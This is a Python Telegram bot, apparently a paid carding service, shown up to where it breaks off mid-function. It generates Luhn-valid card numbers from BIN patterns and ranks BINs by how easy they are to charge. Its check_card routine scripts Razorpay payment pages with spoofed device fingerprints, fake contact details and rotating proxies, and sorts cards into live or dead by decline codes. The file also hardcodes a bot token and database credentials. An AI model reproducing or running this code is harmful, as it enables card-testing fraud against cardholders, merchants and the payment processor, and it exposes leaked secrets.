#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║           NAGU ULTRA BOT v7.0 — REBUILT & CLEANED                      ║
║  Razorpay • Redis • Keys • Plans • Mass • Hit Log • Channel Guard       ║
║  Creator: @bhosade  |  Owner: 7363967303                                ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio, base64, functools, hashlib, html, logging, math
import random, re, secrets, string, time, json
from datetime import datetime
from io import BytesIO
from typing import Optional, Dict, List, Tuple, Set, Any
from collections import defaultdict
from urllib.parse import urlparse, quote

import aiohttp, httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters,
)

# ═══════════════════════════════════════════════════════
# CONFIG — edit the 4 lines marked ←
# ═══════════════════════════════════════════════════════
BOT_TOKEN     = "8995125106:AAGy9CoHcdlW2u-VGli3ztPT5vxeWdtogxU"
ADMIN_USER_ID = 7363967303
BOT_CREATOR   = "@bhosade"
BOT_NAME      = "xLavenderBot"

CHANNEL_LINK  = "https://t.me/+Yc-sBot49rM2OGM1"    # ← your channel
GROUP_LINK    = "https://t.me/+B7IUcx7qJwE0Y2Q1"       # ← your group
CHANNEL_ID    = -1003988595535                  # ← channel chat_id
GROUP_ID      = -1004295609000                  # ← group chat_id

REDIS_URL     = "https://in-swine-133213.upstash.io"
REDIS_TOKEN   = "gQAAAAAAAghdAAIgcDE2YzJmMjQ4OGM1N2Y0YmIxYmI4MWVjYzczMTY4ZmIyNA"

MAX_LIMIT          = 500_000
MAX_SPLIT_PARTS    = 100
MAX_LINES_PER_FILE = 150_000
SEND_DELAY         = 0.30
BATCH_SIZE         = 5
BATCH_DELAY        = 2.0
PROXY_TIMEOUT      = 8
SITE_TIMEOUT       = 10
CARD_TIMEOUT       = 25
RATE_LIMIT         = 5
RATE_WINDOW        = 30
FORCE_AMOUNT       = 100        # ₹1 in paise
MAX_MRZ_CARDS      = 6000       # premium only
MASS_CONCURRENT    = 10

RZP_BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
RZP_BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"

RK_SUDO    = "bot:sudo"
RK_SITES   = "bot:sites"
RK_PROXIES = "bot:proxies"
RK_BINS    = "bot:bins"
RK_STATS   = "bot:stats"
RK_BANNED  = "bot:banned"
RK_KEYS    = "bot:keys_active"

logging.basicConfig(level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s")
logger = logging.getLogger("nagu-v7")

# ═══════════════════════════════════════════════════════
# PREMIUM EMOJI SYSTEM (from your JSON dumps)
# ═══════════════════════════════════════════════════════
_PE: Dict[str, Tuple[str, int]] = {
    # Verdicts / Results
    "check":    ("✅", 5357069174512303778),
    "cross":    ("❌", 5267123797600783095),
    "approved": ("✅", 5260726538302660868),
    "declined": ("❌", 5260342697075416641),
    "charged":  ("💰", 5258204546391351475),
    "live":     ("✅", 5357069174512303778),
    "dead":     ("❌", 5267123797600783095),
    "error":    ("❗️", 5258474669769497337),
    "warning":  ("❗️", 5258474669769497337),
    "success":  ("✅", 5357069174512303778),
    # Card / Payment
    "card":     ("💎", 5359719332542718652),
    "diamond":  ("💎", 5359719332542718652),
    "coin":     ("🪙", 5258368777350816286),
    "money":    ("💰", 5258204546391351475),
    "key":      ("🔖", 5359629206948976159),
    "bin":      ("📚", 5260512129240276089),
    "gate":     ("🚪", 5258084656674250503),
    "redeem":   ("🎁", 5359719332542718652),
    # User / Profile
    "user":     ("👤", 5258362837411045098),
    "users":    ("👥", 5258513401784573443),
    "group":    ("👥", 5258486128742244085),
    "star":     ("⭐️", 5258185631355378853),
    "crown":    ("🎓", 5258334872878980409),
    "plan":     ("💼", 5258260149037965799),
    "info":     ("ℹ️", 5258503720928288433),
    "eye":      ("👁", 5253959125838090076),
    "trophy":   ("🌠", 5258212268742549391),
    # Status / Loading
    "fire":     ("⚡️", 5258152182150077732),
    "bolt":     ("⚡️", 5323404142809467476),
    "loading":  ("🔄", 5258420634785947640),
    "refresh":  ("🔃", 5260687681733533075),
    "clock":    ("🕔", 5258419835922030550),
    "timer":    ("⏲", 5258258882022612173),
    "cooldown": ("⏲", 5258258882022612173),
    "time":     ("🕔", 5258419835922030550),
    # Navigation
    "back":     ("⬅️", 5258236805890710909),
    "right":    ("➡️", 5260450573768990626),
    "down":     ("⬇️", 5258336354642697821),
    "up":       ("⬆️", 5260652420052032852),
    # Admin / Security
    "ban":      ("⛔️", 5275969776668134187),
    "stop":     ("✋", 5258362429389152256),
    "lock":     ("🔒", 5258476306152038031),
    # Data / Files
    "mass":     ("📦", 5258134813302332906),
    "folder":   ("📂", 5258514780469075716),
    "file":     ("📁", 5452165780579843515),
    "doc":      ("📄", 5258477770735885832),
    "notepad":  ("📝", 5257965174979042426),
    "log":      ("📝", 5257965174979042426),
    "bookmark": ("🔖", 5359629206948976159),
    # Network
    "proxy":    ("⛓", 5260730055880876557),
    "site":     ("🌐", 5258093637450866522),
    "search":   ("🔎", 5429571366384842791),
    "tag":      ("🏷", 5296678515536581003),
    # Stats
    "stats":    ("📈", 5258391025281408576),
    "chart":    ("📈", 5258391025281408576),
    "gear":     ("⚙", 5258096772776991776),
    "pin":      ("📍", 5258509201306557640),
    # Social
    "channel":  ("📣", 5260268501515377807),
    "chat":     ("💬", 5258215846450305872),
    "infinity": ("♾", 5271934788037517525),
    "add":      ("➕", 5274008024585871702),
    "robot":    ("🤖", 5258093637450866522),
    "sparkle":  ("✨", 5258212268742549391),
    "eyes":     ("👀", 5260341314095947411),
    "exclaim":  ("❗️", 5258474669769497337),
    "skull":    ("⛔️", 5275969776668134187),
}

def e(key: str) -> str:
    item = _PE.get(key)
    if not item: return "●"
    char, eid = item
    return f'<tg-emoji emoji-id="{eid}">{char}</tg-emoji>'

def safe(v: Any) -> str: return html.escape(str(v))
def btn(label: str, data: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(label, callback_data=data)

# ═══════════════════════════════════════════════════════
# REDIS CLIENT
# ═══════════════════════════════════════════════════════
class RedisClient:
    def __init__(self, url: str, token: str):
        self._url = url.rstrip("/")
        self._hdr = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

    async def _req(self, *args) -> Any:
        try:
            async with httpx.AsyncClient(timeout=10) as c:
                r = await c.post(f"{self._url}/pipeline", headers=self._hdr, json=[list(args)])
                r.raise_for_status()
                d = r.json()
                if isinstance(d, list) and d: return d[0].get("result")
                return d.get("result") if isinstance(d, dict) else None
        except Exception as ex:
            logger.error(f"Redis [{args[0]}]: {ex}"); return None

    async def get(self, k):           return await self._req("GET", k)
    async def set(self, k, v):        return await self._req("SET", k, v) == "OK"
    async def sadd(self, k, *m):      return await self._req("SADD", k, *m) or 0
    async def srem(self, k, *m):      return await self._req("SREM", k, *m) or 0
    async def smembers(self, k):
        r = await self._req("SMEMBERS", k); return set(r) if r else set()
    async def sismember(self, k, m):  return bool(await self._req("SISMEMBER", k, m))
    async def lpush(self, k, *v):     return await self._req("LPUSH", k, *v) or 0
    async def lrange(self, k, s, e_):
        r = await self._req("LRANGE", k, s, e_); return r if r else []
    async def lrem(self, k, c, el):   return await self._req("LREM", k, c, el) or 0
    async def llen(self, k):          return await self._req("LLEN", k) or 0
    async def delete(self, *k):       return await self._req("DEL", *k) or 0
    async def incr(self, k):          return await self._req("INCR", k) or 0
    async def hset(self, k, f, v):    return await self._req("HSET", k, f, v) or 0
    async def hget(self, k, f):       return await self._req("HGET", k, f)
    async def hgetall(self, k):
        r = await self._req("HGETALL", k)
        if not r: return {}
        it = iter(r); return {kk: vv for kk, vv in zip(it, it)}
    async def hdel(self, k, *f):      return await self._req("HDEL", k, *f) or 0
    async def exists(self, k):        return bool(await self._req("EXISTS", k))
    async def hincrby(self, k, f, n): return await self._req("HINCRBY", k, f, n) or 0

redis = RedisClient(REDIS_URL, REDIS_TOKEN)

# ═══════════════════════════════════════════════════════
# RATE LIMITING
# ═══════════════════════════════════════════════════════
_rate_map: Dict[int, List[float]] = defaultdict(list)

def check_rate(uid: int) -> Tuple[bool, Optional[str]]:
    now = time.time()
    reqs = _rate_map[uid]
    reqs[:] = [t for t in reqs if now - t < RATE_WINDOW]
    if len(reqs) >= RATE_LIMIT:
        return False, f"Wait {int(RATE_WINDOW-(now-reqs[0]))}s"
    reqs.append(now); return True, None

# ═══════════════════════════════════════════════════════
# AUTHORIZATION
# ═══════════════════════════════════════════════════════
def is_admin(uid: int) -> bool: return uid == ADMIN_USER_ID

async def is_sudo(uid: int) -> bool:
    if is_admin(uid): return True
    return await redis.sismember(RK_SUDO, str(uid))

async def is_banned(uid: int) -> bool:
    return await redis.sismember(RK_BANNED, str(uid))

async def has_plan(uid: int) -> bool:
    exp = await redis.hget(f"bot:u:{uid}", "plan_exp")
    if not exp: return False
    try: return float(exp) > time.time()
    except: return False

async def is_auth(uid: int) -> bool:
    if is_admin(uid) or await is_sudo(uid): return True
    return await has_plan(uid)

async def get_role(uid: int) -> str:
    if is_admin(uid): return "Owner"
    if await is_sudo(uid): return "Sudo"
    if await has_plan(uid):
        return await redis.hget(f"bot:u:{uid}", "plan_name") or "Premium"
    return "Free"

# In-memory trackers
active_tests: Dict[int, bool] = {}
active_mrz:   Dict[int, asyncio.Event] = {}
mrz_results:  Dict[int, Dict[str, List[str]]] = {}   # uid → {charged,approved,dead,errors}

# ═══════════════════════════════════════════════════════
# CHANNEL / GROUP JOIN GUARD
# ═══════════════════════════════════════════════════════
async def check_joined(bot, uid: int) -> Tuple[bool, bool]:
    ch = gr = True
    if CHANNEL_ID and CHANNEL_ID != -1001234567890:
        try:
            m = await bot.get_chat_member(CHANNEL_ID, uid)
            ch = m.status not in (ChatMember.BANNED, ChatMember.LEFT)
        except: ch = True
    if GROUP_ID and GROUP_ID != -1009876543210:
        try:
            m = await bot.get_chat_member(GROUP_ID, uid)
            gr = m.status not in (ChatMember.BANNED, ChatMember.LEFT)
        except: gr = True
    return ch, gr

async def enforce_join(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> bool:
    uid = update.effective_user.id
    if is_admin(uid) or await is_sudo(uid): return True
    ch, gr = await check_joined(ctx.bot, uid)
    if ch and gr: return True
    rows = []
    if not ch: rows.append([InlineKeyboardButton(f"{e('channel')} Join Channel", url=CHANNEL_LINK)])
    if not gr: rows.append([InlineKeyboardButton(f"{e('group')} Join Group",   url=GROUP_LINK)])
    rows.append([btn(f"{e('check')} I Joined — Verify", "verify_join")])
    await update.message.reply_text(
        f"{e('lock')} <b>Join Required!</b>\n\n"
        f"{'❌' if not ch else '✅'} Channel\n"
        f"{'❌' if not gr else '✅'} Group\n\n"
        f"Join both then press <b>Verify</b>.",
        parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(rows))
    return False

# Decorators
def need_join(func):
    @functools.wraps(func)
    async def wrap(u: Update, c: ContextTypes.DEFAULT_TYPE):
        uid = u.effective_user.id
        if await is_banned(uid):
            await u.message.reply_text(f"{e('ban')} <b>Banned.</b>", parse_mode=ParseMode.HTML); return
        if not await enforce_join(u, c): return
        return await func(u, c)
    return wrap

def need_premium(func):
    @functools.wraps(func)
    async def wrap(u: Update, c: ContextTypes.DEFAULT_TYPE):
        uid = u.effective_user.id
        if await is_banned(uid):
            await u.message.reply_text(f"{e('ban')} <b>Banned.</b>", parse_mode=ParseMode.HTML); return
        if not await enforce_join(u, c): return
        if not await is_auth(uid):
            await u.message.reply_text(
                f"{e('lock')} <b>Premium Required</b>\n\n"
                f"{e('plan')} Use <code>/plans</code> to see plans\n"
                f"{e('key')} Use <code>/redeem KEY</code> to activate",
                parse_mode=ParseMode.HTML); return
        return await func(u, c)
    return wrap

def need_sudo(func):
    @functools.wraps(func)
    async def wrap(u: Update, c: ContextTypes.DEFAULT_TYPE):
        uid = u.effective_user.id
        if await is_banned(uid):
            await u.message.reply_text(f"{e('ban')} <b>Banned.</b>", parse_mode=ParseMode.HTML); return
        if not await is_sudo(uid):
            await u.message.reply_text(
                f"{e('lock')} <b>Access Denied</b>\n{e('crown')} Sudo only.",
                parse_mode=ParseMode.HTML); return
        return await func(u, c)
    return wrap

# ═══════════════════════════════════════════════════════
# PROXY UTILITIES — auto-removes dead proxies
# ═══════════════════════════════════════════════════════
def parse_proxy(raw: str) -> Optional[str]:
    raw = raw.strip()
    if not raw: return None
    if "://" in raw: return raw
    parts = raw.split(":")
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    if "@" in raw:
        creds, addr = raw.rsplit("@", 1)
        return f"http://{creds}@{addr}"
    return None

async def test_proxy_raw(raw: str) -> Tuple[bool, float]:
    url = parse_proxy(raw)
    if not url: return False, 0.0
    t0 = time.monotonic()
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as s:
            async with s.get("http://ip-api.com/json", proxy=url,
                             timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
                lat = (time.monotonic()-t0)*1000
                return r.status == 200, round(lat, 1)
    except: return False, 0.0

async def get_live_proxies(auto_remove: bool = True) -> List[str]:
    """Return live proxy URL strings. Removes dead ones from Redis if auto_remove."""
    raw_list = await redis.lrange(RK_PROXIES, 0, -1)
    if not raw_list: return []

    async def _check(raw: str) -> Optional[str]:
        ok, _ = await test_proxy_raw(raw)
        if not ok and auto_remove:
            await redis.lrem(RK_PROXIES, 0, raw)
            logger.info(f"Auto-removed dead proxy: {raw[:30]}")
            return None
        if ok:
            u = parse_proxy(raw)
            return u
        return None

    results = await asyncio.gather(*[_check(p) for p in raw_list], return_exceptions=True)
    return [r for r in results if isinstance(r, str)]

def pick_proxy(proxies: List[str]) -> Optional[str]:
    return random.choice(proxies) if proxies else None

# ═══════════════════════════════════════════════════════
# SITE UTILITIES — auto-removes dead/invalid sites
# ═══════════════════════════════════════════════════════
def _extract_json_var(content: str, var_name: str) -> str:
    prefix = f"var {var_name} ="
    idx = content.find(prefix)
    if idx == -1: return ""
    idx += len(prefix)
    while idx < len(content) and content[idx] in " \t\n\r": idx += 1
    if idx >= len(content) or content[idx] != "{": return ""
    depth = 0; in_s = False; esc = False
    for i in range(idx, len(content)):
        c = content[i]
        if esc: esc = False; continue
        if c == "\\" and in_s: esc = True; continue
        if c == '"': in_s = not in_s; continue
        if in_s: continue
        if c == "{": depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0: return content[idx:i+1]
    return ""

async def load_site_data(url: str, UA: str, proxy_url: Optional[str] = None,
                          auto_remove: bool = True) -> Optional[Dict]:
    try:
        kw = {"proxy": proxy_url} if proxy_url else {}
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=conn) as sess:
            async with sess.get(url, headers={"User-Agent": UA, "Accept": "text/html,*/*"},
                                timeout=aiohttp.ClientTimeout(total=SITE_TIMEOUT), **kw) as r:
                if r.status != 200:
                    if auto_remove:
                        await redis.lrem(RK_SITES, 0, url)
                        logger.info(f"Auto-removed dead site [{r.status}]: {url[:50]}")
                    return None
                body = await r.text(errors="replace")
        js = _extract_json_var(body, "data")
        if not js:
            if auto_remove:
                await redis.lrem(RK_SITES, 0, url)
                logger.info(f"Auto-removed no-data site: {url[:50]}")
            return None
        d = json.loads(js)
        if d.get("error_code") or d.get("message"):
            if auto_remove:
                await redis.lrem(RK_SITES, 0, url)
                logger.info(f"Auto-removed error site: {url[:50]}")
            return None
        key_id = d.get("key_id", "") or d.get("key", "")
        if not key_id: return None
        pl = d.get("payment_link") or d.get("payment_page") or {}
        plink = pl.get("id", "")
        items = pl.get("payment_page_items", [])
        ppid  = items[0].get("id", "") if items else ""
        if not plink: return None
        return {"url": url, "key_id": key_id, "plink": plink,
                "ppid": ppid, "keyless": d.get("keyless_header", "")}
    except: return None

async def get_live_sites(proxy_urls: List[str]) -> List[Dict]:
    """Load sites from Redis, auto-remove dead/invalid ones."""
    raw_sites = await redis.lrange(RK_SITES, 0, -1)
    if not raw_sites: return []
    UA = _gen_ua()
    conn = aiohttp.TCPConnector(ssl=False, limit=8)
    async with aiohttp.ClientSession(connector=conn) as sess:
        tasks = []
        for i, site in enumerate(raw_sites):
            px = proxy_urls[i % len(proxy_urls)] if proxy_urls else None
            tasks.append(load_site_data(site, UA, px, auto_remove=True))
        results = await asyncio.gather(*tasks, return_exceptions=True)
    return [r for r in results if isinstance(r, dict)]

# ═══════════════════════════════════════════════════════
# BIN LOOKUP (enhanced — VBV/3DS analysis, level)
# ═══════════════════════════════════════════════════════
_VBV_NETS = {"visa", "mastercard", "amex"}

async def lookup_bin(bin6: str) -> Dict[str, str]:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://lookup.binlist.net/{bin6[:8]}",
                             headers={"Accept-Version": "3"},
                             timeout=aiohttp.ClientTimeout(total=6)) as r:
                if r.status == 200:
                    d = await r.json()
                    scheme  = d.get("scheme", "unknown").lower()
                    typ     = d.get("type", "unknown")
                    brand   = d.get("brand", "")
                    bank    = d.get("bank", {}).get("name", "Unknown")
                    country = d.get("country", {}).get("name", "Unknown")
                    flag    = d.get("country", {}).get("emoji", "")
                    prepaid = d.get("prepaid", False)
                    # Level detection
                    level = "UNKNOWN"
                    if brand:
                        bl = brand.upper()
                        for kw in ("PLATINUM", "GOLD", "BLACK", "INFINITE", "WORLD", "SIGNATURE",
                                   "CLASSIC", "STANDARD", "BUSINESS", "CORPORATE"):
                            if kw in bl: level = kw; break
                    # VBV/3DS verdict
                    needs_3ds = scheme in _VBV_NETS
                    vbv_type = "VBV" if scheme == "visa" else \
                               "3DS" if scheme == "mastercard" else \
                               "SafeKey" if scheme == "amex" else "3DS"
                    ease = "harder to charge" if needs_3ds else "easier to charge"
                    return {
                        "scheme": scheme.upper(), "type": typ.upper(),
                        "brand": brand, "level": level,
                        "bank": bank, "country": country, "flag": flag,
                        "prepaid": "Yes" if prepaid else "No",
                        "vbv_type": vbv_type, "needs_3ds": needs_3ds, "ease": ease,
                    }
    except: pass
    return {"scheme": "UNKNOWN", "type": "UNKNOWN", "brand": "", "level": "UNKNOWN",
            "bank": "Unknown", "country": "Unknown", "flag": "",
            "prepaid": "No", "vbv_type": "3DS", "needs_3ds": True, "ease": "unknown"}

def get_brand(cc: str) -> str:
    if cc.startswith("4"): return "visa"
    if cc[:2] in ("51","52","53","54","55") or cc[:4] in ("2221","2720"): return "mastercard"
    if cc[:2] in ("34","37"): return "amex"
    if cc.startswith("6011") or cc.startswith("65"): return "discover"
    return "unknown"

def net_display(cc: str) -> str:
    b = get_brand(cc)
    return {"visa":"🟦 VISA","mastercard":"🟥 MC","amex":"🟨 AMEX","discover":"🟩 DISC"}.get(b,"⬛ UNK")

# ═══════════════════════════════════════════════════════
# CARD GENERATION (Luhn + BIN patterns)
# ═══════════════════════════════════════════════════════
ISSUERS = {
    "visa":       {"pfx": ["4"],     "len": 16, "cvv": 3},
    "mastercard": {"pfx": ["51","52","53","54","55","2221","2720"],
                   "len": 16, "cvv": 3},
    "amex":       {"pfx": ["34","37"],             "len": 15, "cvv": 4},
    "discover":   {"pfx": ["6011","65"],            "len": 16, "cvv": 3},
    "rupay":      {"pfx": ["508528","6069","6521"], "len": 16, "cvv": 3},
}

def _issuer(b: str) -> Optional[str]:
    for name, d in ISSUERS.items():
        if any(b.startswith(p) for p in d["pfx"]): return name
    return None

def luhn(partial: str) -> Optional[str]:
    if not partial.isdigit(): return None
    digits = [int(c) for c in partial]
    for i in range(len(digits)-2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9: digits[i] -= 9
    chk = (10 - sum(digits) % 10) % 10
    return partial + str(chk)

def gen_card(bp: str) -> Optional[str]:
    try:
        part = bp.split("|")[0].strip().lower()
        if not all(c.isdigit() or c == "x" for c in part): return None
        result = "".join(str(random.randint(0,9)) if c == "x" else c for c in part)
        issuer = _issuer(result)
        if not issuer: return None
        req = ISSUERS[issuer]["len"]
        while len(result) < req - 1:
            result += str(random.randint(0,9))
        pan = luhn(result[:req-1])
        if not pan or len(pan) != req: return None
        parts = bp.split("|")
        cy = datetime.now().year % 100
        def rnd(val, ln, lo, hi):
            if not val or val.lower() in ("rnd","x",""):
                return str(random.randint(lo,hi)).zfill(ln)
            if "x" in val.lower():
                return "".join(str(random.randint(0,9)) if c.lower()=="x" else c for c in val)[-ln:].zfill(ln)
            return ("".join(c for c in val if c.isdigit()))[-ln:].zfill(ln)
        mm  = rnd(parts[1] if len(parts)>1 else None, 2, 1, 12)
        yy  = rnd(parts[2] if len(parts)>2 else None, 2, cy+2, cy+8)
        cvv = rnd(parts[3] if len(parts)>3 else None, ISSUERS[issuer]["cvv"], 0, 10**ISSUERS[issuer]["cvv"]-1)
        return f"{pan}|{mm}|{yy}|{cvv}"
    except: return None

def gen_cards(bp: str, count: int):
    seen: Set[str] = set()
    att = 0
    while len(seen) < count and att < count * 15:
        att += 1
        c = gen_card(bp)
        if c and c not in seen:
            seen.add(c); yield c

def parse_cc(s: str) -> Optional[Tuple[str,str,str,str]]:
    for sep in ["|", "/", ":", " "]:
        p = s.strip().split(sep)
        if len(p) >= 4:
            cc  = "".join(x for x in p[0] if x.isdigit())
            mm  = "".join(x for x in p[1] if x.isdigit())
            yy  = "".join(x for x in p[2] if x.isdigit())
            cvv = "".join(x for x in p[3] if x.isdigit())
            if len(cc) >= 13 and 1 <= int(mm or "0") <= 12:
                return cc, mm, yy, cvv
    return None

def validate_bin(b: str) -> Tuple[bool, str]:
    part = b.split("|")[0].strip()
    if not all(c.isdigit() or c.lower()=="x" for c in part): return False, "Only digits and x"
    if len(part) < 4: return False, "Too short (min 4)"
    if len(part) > 19: return False, "Too long (max 19)"
    return True, ""

# ═══════════════════════════════════════════════════════
# RAZORPAY ENGINE (9-step, full flow)
# ═══════════════════════════════════════════════════════
def _gen_ua() -> str:
    maj = random.randint(120,148); bld = random.randint(5000,7000); ptch = random.randint(50,250)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{maj}.0.{bld}.{ptch} Safari/537.36"

def _gen_phone() -> str:
    return "+91" + random.choice(["6","7","8","9"]) + "".join(str(random.randint(0,9)) for _ in range(9))

def _gen_email() -> str:
    names = ["alex","john","mike","sara","david","emma","james","lisa","chris","anna"]
    return random.choice(names) + str(random.randint(100,9999)) + "@gmail.com"

def _gen_device() -> Tuple[str,str]:
    buf = secrets.token_bytes(16)
    h   = hashlib.sha1(buf).hexdigest()
    ts  = str(int(time.time()*1000))
    return f"1.{h}.{ts}.{random.randint(0,99999999):08d}", h

def _gs(d: dict, k: str) -> str:
    v = d.get(k) if d else None
    return v if isinstance(v, str) else (str(v) if v is not None else "")

def _is_live_signal(desc: str, code: str) -> bool:
    ml = desc.lower()
    return any(k in ml for k in [
        "insufficient","balance","funds","cvv","auth","3d","3ds","otp",
        "declined by bank","do_not_honor","transaction_not","card_holder",
        "authentication","blocked","limit","expired","incorrect_cvv"
    ]) or "incorrect_cvv" in code.lower()

async def check_card(cc: str, mm: str, yy: str, cvv: str,
                     site: Dict, proxy_url: Optional[str] = None,
                     amount: int = FORCE_AMOUNT) -> Dict[str, Any]:
    """Full 9-step Razorpay flow. Returns status: charged/approved/declined/error."""
    yy2 = yy[-2:] if len(yy) == 4 else yy
    brand  = get_brand(cc)
    ua     = _gen_ua()
    phone  = _gen_phone()
    email  = _gen_email()
    dev_id, fhash = _gen_device()
    sess_id = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(14))

    kw = {"proxy": proxy_url} if proxy_url else {}
    target_url = site["url"]
    key_id  = site["key_id"]
    plink   = site["plink"]
    ppid    = site["ppid"]
    keyless = site["keyless"]
    kl_enc  = quote(keyless) if keyless else ""

    conn = aiohttp.TCPConnector(ssl=False)
    jar  = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(
        connector=conn, cookie_jar=jar,
        headers={"User-Agent": ua, "Accept-Language": "en-US,en;q=0.5"},
        timeout=aiohttp.ClientTimeout(total=CARD_TIMEOUT),
    ) as sess:
        # S3: Create order
        try:
            async with sess.post(
                f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
                json={"notes":{"comment":"","name":"User"},
                      "line_items":[{"payment_page_item_id":ppid,"amount":amount}]},
                headers={"Accept":"application/json","Content-Type":"application/json",
                         "Origin":"https://pages.razorpay.com","Referer":"https://pages.razorpay.com/"},
                **kw) as r2:
                r2d = json.loads(await r2.text(errors="replace"))
        except Exception as ex:
            return {"status":"error","message":f"Order: {str(ex)[:50]}"}
        order_obj = r2d.get("order",{}) or {}
        order_id  = _gs(order_obj,"id")
        if not order_id:
            desc = _gs(r2d.get("error",{}),"description") or "Order failed"
            return {"status":"error","message":desc[:80]}
        ckid = order_id.split("_",1)[1] if "_" in order_id else order_id
        oamt = float(order_obj.get("amount") or amount)
        if oamt < 100: oamt = float(amount)
        ocur = _gs(order_obj,"currency") or "INR"

        # S4: Session token
        try:
            async with sess.get("https://api.razorpay.com/v1/checkout/public",
                params={"traffic_env":"production","build":RZP_BUILD,"build_v1":RZP_BUILD_V1,
                        "checkout_v2":"1","new_session":"1","keyless_header":keyless,
                        "rzp_device_id":dev_id,"unified_session_id":sess_id},
                headers={"Accept":"text/html,*/*","Referer":"https://pages.razorpay.com/"}, **kw) as r3:
                r3t = await r3.text(errors="replace")
        except Exception as ex:
            return {"status":"error","message":f"Session: {str(ex)[:50]}"}
        tok = ""
        m = re.search(r'window\.session_token="([A-F0-9]{40,})"', r3t)
        if m: tok = m.group(1)
        if not tok:
            m2 = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', r3t)
            if m2: tok = m2.group(1)
        if not tok:
            return {"status":"error","message":"No session token"}

        rzp_ref = (f"https://api.razorpay.com/v1/checkout/public?traffic_env=production"
                   f"&build={RZP_BUILD}&build_v1={RZP_BUILD_V1}&checkout_v2=1"
                   f"&new_session=1&unified_session_id={sess_id}&session_token={tok}")
        sh = {"Accept":"*/*","Origin":"https://api.razorpay.com","Referer":rzp_ref,"x-session-token":tok}

        # S5–S7: Prefs, checkout order, cross-border (fire-and-forget)
        for _coro in [
            sess.post(f"https://api.razorpay.com/v2/standard_checkout/preferences"
                      f"?x_entity_id={order_id}&session_token={tok}&keyless_header={keyless}",
                json={"query":[{"resource":r} for r in
                               ["checkout_version_config","merchant","methods","order","experiments"]],
                      "query_params":{"device_id":dev_id,"amount":oamt,"currency":ocur,
                                      "order_id":order_id,"payment_link_id":plink,"contact":phone},
                      "action":"get"},
                headers={**sh,"Content-Type":"application/json"}, **kw),
            sess.post(f"https://api.razorpay.com/v1/standard_checkout/checkout/order"
                      f"?key_id={key_id}&session_token={tok}&keyless_header={keyless}",
                data={"notes[email]":email,"notes[phone]":phone[3:],"payment_link_id":plink,
                      "key_id":key_id,"contact":phone,"email":email,"currency":ocur,
                      "_[integration]":"payment_pages","_[device.id]":dev_id,
                      "_[library]":"checkoutjs","_[platform]":"browser",
                      "_[shield][fhash]":fhash,"_[shield][tz]":"0","_[device_id]":dev_id,
                      "_[build]":RZP_BUILD,"_[shield][os]":"windows","_[shield][browser]":"chrome",
                      "_[request_index]":"0","amount":str(int(oamt)),"order_id":order_id,
                      "method":"card","checkout_id":ckid},
                headers={**sh,"Content-Type":"application/x-www-form-urlencoded"}, **kw),
        ]:
            try: await _coro
            except: pass

        # S8: Submit card
        sardine = base64.b64encode(
            json.dumps([{"name":"sardine","metadata":{"session_id":ckid}}]).encode()).decode()
        form8 = {
            "user_risk_providers_token":sardine,
            "notes[comment]":"","notes[email]":email,"notes[phone]":phone[3:],"notes[name]":"User",
            "payment_link_id":plink,"key_id":key_id,"contact":phone,"email":email,"currency":ocur,
            "_[integration]":"payment_pages","_[checkout_id]":ckid,"_[device.id]":dev_id,
            "_[env]":"","_[library]":"checkoutjs","_[library_src]":"no-src",
            "_[current_script_src]":"no-src","_[is_magic_script]":"false","_[platform]":"browser",
            "_[referer]":target_url,"_[shield][fhash]":fhash,"_[shield][tz]":"-330",
            "_[device_id]":dev_id,"_[build]":RZP_BUILD,"_[shield][os]":"windows",
            "_[shield][platform]":"browser","_[shield][browser]":"chrome","_[request_index]":"1",
            "amount":str(int(oamt)),"order_id":order_id,"method":"card",
            "card[number]":cc,"card[cvv]":cvv,"card[name]":"User",
            "card[expiry_month]":mm,"card[expiry_year]":f"20{yy2}",
            "save":"0","dcc_currency":ocur,
        }
        try:
            async with sess.post(
                f"https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
                f"?x_entity_id={order_id}&session_token={tok}&keyless_header={keyless}",
                data=form8, headers=sh, **kw) as r8:
                r8d = json.loads(await r8.text(errors="replace"))
        except asyncio.TimeoutError:
            return {"status":"error","message":"Timeout"}
        except Exception as ex:
            return {"status":"error","message":str(ex)[:60]}

        pay_id = _gs(r8d,"payment_id") or _gs(r8d,"id")
        if not pay_id:
            err   = r8d.get("error",{}) or {}
            desc  = _gs(err,"description").replace(" Try another payment method or contact your bank for details.","").strip()
            code  = _gs(err,"reason")
            label = f"{desc} ({code})" if code else desc or "Unknown decline"
            if _is_live_signal(desc, code):
                return {"status":"approved","message":label,"bin":cc[:6]}
            return {"status":"declined","message":label}

        pid_c = pay_id.split("_",1)[1] if "_" in pay_id else pay_id
        # S9a: Authenticate
        for auth_url in [
            f"https://api.razorpay.com/pg_router/v1/payments/{pay_id}/authenticate",
            f"https://api.razorpay.com/pg_router/v1/payments/{pid_c}/authenticate",
        ]:
            try:
                await sess.post(auth_url,
